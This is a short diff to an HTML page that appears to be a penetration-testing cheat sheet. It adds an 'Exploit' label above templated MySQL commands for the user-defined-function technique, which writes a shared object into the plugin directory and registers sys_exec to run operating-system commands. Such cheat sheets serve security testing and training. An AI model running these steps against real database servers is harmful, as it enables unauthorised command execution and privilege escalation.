@@ -102,6 +102,7 @@ layout: default
             <ul>
                 <li>Get plugins directory:
                     <pre>SHOW VARIABLES LIKE &apos;plugin_dir&apos;;</pre>
+                <li>Exploit</li>
                     <pre>&#13;&#10;                        use mysql;&#13;&#10;                        create table foo(line blob);&#13;&#10;                        insert into foo values(load_file(&apos;&lt;udf exploit shared object&gt;&apos;));&#13;&#10;                        select * from foo into dumpfile &apos;&lt;sql plugin directory&gt;/&lt;udf explit shared object&gt;&apos;;&#13;&#10;                        create function sys_exec returns integer soname &apos;&lt;udf explit shared object&gt;&apos;;&#13;&#10;                        select * from mysql.func;&#13;&#10;                        select &lt;shared object library symbol/function&gt;(&apos;&lt;command&gt;&apos;)&#13;&#10;                        </pre>
                 </li>
                 <li>Shared Objects</li>
